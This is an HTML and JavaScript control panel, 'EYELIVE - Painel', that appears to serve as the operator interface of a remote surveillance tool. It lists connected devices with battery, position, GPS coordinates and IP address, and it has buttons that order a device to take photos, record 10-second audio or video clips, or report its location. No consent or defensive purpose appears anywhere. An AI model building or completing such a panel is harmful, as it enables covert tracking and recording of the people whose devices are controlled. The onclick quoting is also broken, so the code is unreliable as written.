<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        body{background:#0a0a1a;color:#fff;font-family:monospace;padding:10px;margin:0}
        .card{background:#1a1a3e;border:1px solid #333;border-radius:12px;padding:15px;margin:10px 0}
        h1{color:#ffd700;text-align:center;font-size:1.2em}
        .on{color:#00ff88}.off{color:#ff4444}
        .data{color:#bbb;font-size:12px;line-height:1.6}
        .btn{background:#ffd700;color:#000;padding:8px 14px;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin:4px;font-size:12px}
        .btn-red{background:#ff4444;color:#fff}
        .btn-green{background:#00ff88;color:#000}
        .map{width:100%;height:150px;background:#111;border-radius:8px;margin:8px 0}
        .live{display:flex;gap:5px;flex-wrap:wrap}
    </style>
</head>
<body>
    <h1>EYELIVE - Painel</h1>
    <div id="devices">Carregando...</div>
    
    <script>
    function load(){
        fetch('/painel_data')
        .then(function(r){return r.json()})
        .then(function(devices){
            var h = '';
            devices.forEach(function(d){
                var status = d.status == 'online' ? 'ON' : 'OFF';
                var color = d.status == 'online' ? 'on' : 'off';
                h += '<div class="card">';
                h += '<h3 class="'+color+'">' + status + ' - ' + d.nome + '</h3>';
                h += '<div class="data">';
                h += '<p>Bateria: ' + d.bateria + (d.carregando ? ' [CARREGANDO]' : '') + ' | Atualizado: ' + d.ultimo_update + '</p>';
                h += '<p>Posicao: ' + d.posicao + '</p>';
                h += '<p>GPS: ' + d.gps.lat + ', ' + d.gps.lng + '</p>';
                h += '<p>IP: ' + d.ip + '</p>';
                h += '<div class="live">';
                h += '<button class="btn" onclick="cmd(''+d.id+'','foto')">Foto</button>';
                h += '<button class="btn btn-green" onclick="cmd(''+d.id+'','audio')">Audio 10s</button>';
                h += '<button class="btn btn-red" onclick="cmd(''+d.id+'','video')">Video 10s</button>';
                h += '<button class="btn" onclick="cmd(''+d.id+'','localizacao')">GPS Atual</button>';
                h += '</div>';
                h += '</div></div>';
            });
            document.getElementById('devices').innerHTML = h || '<p>Nenhum dispositivo conectado</p>';
        });
    }
    
    function cmd(device, comando){
        fetch('/cmd?device='+device+'&cmd='+comando)
        .then(function(r){return r.json()})
        .then(function(d){
            alert(d.msg || d.error || 'Comando enviado!');
        });
    }
    
    setInterval(load, 8000);
    load();
    </script>
</body>
</html>
